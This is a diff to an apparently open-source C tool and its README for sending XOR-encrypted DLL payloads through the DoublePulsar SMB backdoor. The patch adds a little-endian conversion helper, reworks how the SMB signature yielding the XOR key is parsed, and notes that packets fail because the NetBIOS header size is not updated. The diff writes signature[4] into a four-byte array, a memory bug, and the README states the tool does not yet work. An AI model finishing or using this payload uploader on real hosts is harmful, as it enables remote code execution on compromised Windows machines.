@@ -19,7 +19,12 @@ BEFORE the XOR encryption, you must include the EXE length after the DLL which i
 
 the payload buffer is then XOR encrypted with the doublepulsar key and ready to ship.
 
-However...currently it is unable to send packets for some reason which I do not know.
+ISSUES:
+Currently it is unable to send packets for some reason.  
+
+EDIT: the reason is because the NetBIOS data header is not being updated.
+The NetBIOS header must be updated for the packet size.  
+I will fix this in a later release.
 
 Currently compiles but does NOT work as of March 7th 2021
 
@@ -5460,6 +5465,19 @@ unsigned int ComputeDOUBLEPULSARXorKey(unsigned int sig)
 		(((sig << 16) | sig & 0xFF00) << 8));
 }
 
+unsigned int LE2INT(unsigned char *data)
+{
+            unsigned int b;
+            b = data[3];
+            b <<= 8;
+            b += data[2];
+            b <<= 8;
+            b += data[1];
+            b <<= 8;
+            b += data[0];
+            return b;
+}
+
 int xor_payload(unsigned int xor_key, unsigned char* buf, int size)
 {
 	int i;
@@ -5640,18 +5658,22 @@ int main(int argc, char* argv[])
 	}
 	processid = *(WORD*)(recvbuff + 30);
 
-	unsigned char signature[5]; //changed from 5 to 4 because I commented out the arch portion
+	unsigned char signature[4]; //changed from 5 to 4 because I commented out the architecture portion
 	unsigned int sig;
 	//copy SMB signature from recvbuff to local buffer
 	signature[0] = recvbuff[18];
 	signature[1] = recvbuff[19];
 	signature[2] = recvbuff[20];
 	signature[3] = recvbuff[21];
+	signature[4] = '\0';
+	
 	//this determines the architecture
-	signature[4] = recvbuff[22];
+	//recvbuff[22];
+	//but unused at this time
 
 	//convert the signature buffer to unsigned integer 
-	memcpy((unsigned int*)&sig, (unsigned int*)&signature, sizeof(unsigned int));
+	//memcpy((unsigned int*)&sig, (unsigned int*)&signature, sizeof(unsigned int));
+	sig = LE2INT(signature);
 
 	//calculate the XOR key for DoublePulsar
 	unsigned int XorKey = ComputeDOUBLEPULSARXorKey(sig);
